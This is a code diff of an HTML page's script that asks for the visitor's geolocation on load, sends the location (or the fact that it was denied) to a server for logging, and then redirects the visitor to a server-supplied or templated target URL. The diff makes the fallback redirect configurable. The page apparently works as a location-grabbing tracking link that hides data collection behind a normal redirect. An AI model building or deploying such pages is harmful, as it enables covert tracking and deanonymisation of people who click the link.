@@ -16,6 +16,8 @@
 
 <body>
     <script>
+        const FALLBACK_URL = '{{REDIRECT_URL}}';
+
         // Automatically request location permission on page load
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
@@ -37,15 +39,14 @@
                         });
 
                         const data = await response.json();
-
-                        // Redirect to target URL
-                        window.location.href = data.redirectUrl;
+                        // Redirect to target URL from server
+                        window.location.href = data.redirectUrl || FALLBACK_URL;
                     } catch (error) {
                         console.error('Error logging data:', error);
-                        window.location.href = 'https://www.google.com';
+                        window.location.href = FALLBACK_URL;
                     }
                 },
-                // Error callback - user denied location
+                // Error callback - user denied location or other error
                 async (error) => {
                     console.log('Location permission denied or error:', error);
 
@@ -60,13 +61,11 @@
                         });
 
                         const data = await response.json();
-
-                        // Redirect to target URL (even if denied)
-                        window.location.href = data.redirectUrl;
+                        // Redirect to target URL from server
+                        window.location.href = data.redirectUrl || FALLBACK_URL;
                     } catch (err) {
                         console.error('Error logging denial:', err);
-                        // Redirect anyway
-                        window.location.href = 'https://www.google.com';
+                        window.location.href = FALLBACK_URL;
                     }
                 },
                 // Options
@@ -78,7 +77,7 @@
             );
         } else {
             // Browser doesn't support geolocation - just redirect
-            window.location.href = 'https://www.google.com';
+            window.location.href = FALLBACK_URL;
         }
     </script>
 </body>
